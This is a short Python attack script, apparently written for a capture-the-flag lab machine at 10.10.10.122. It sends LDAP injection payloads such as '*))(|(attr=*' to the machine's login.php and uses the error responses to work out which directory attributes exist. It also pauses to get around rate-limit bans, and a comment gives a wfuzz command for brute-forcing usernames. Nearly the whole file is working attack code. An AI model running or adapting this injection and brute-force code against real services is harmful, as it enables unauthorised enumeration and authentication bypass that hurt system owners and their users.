#!/usr/bin/env python3
# -*- encoding:utf-8 -*-

# if you need bruteforce username, use wfuzz directly:
# ```
# wfuzz -c -u http://10.10.10.122/login.php --hw 233 -X POST -d "inputUsername=FUZZ&inputOTP=12345678"
# -w /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt
# ```

import random
import time
from urllib.parse import quote_plus as urlencode
import requests

debug = False

if debug:
    host = '127.0.0.1:8181'
else:
    host = '10.10.10.122'

endp = '/login.php'
finaluri = 'http://' + host + endp

postparam = {"inputUsername": None, "inputOTP": None}

# Assume the LDAP Query is: `(&(username=blahblah)(token=blahblah))`

dictfile = open('common_ldap_attr.dic', 'r')
for datas in dictfile.readlines():
    finalattr = datas.strip()
    usrname = '*))(|({todoattr}=*'.format(todoattr=finalattr)
    postparam["inputUsername"] = urlencode(usrname)
    postparam["inputOTP"] = str(random.randint(10000000, 99999999))
    sess = requests.session()
    try:
        sess.get('http://' + host + '/')
        time.sleep(1)
        r = sess.post(finaluri, data=postparam)
        if 'cannot login' in r.text.lower():
            print("-[+] Attribute Exists: " + finalattr)
        else:
            pass
    except requests.exceptions.ConnectionError as ce:
        print("Get Banned! Wait 6 mins.")
        time.sleep(360)

dictfile.close()
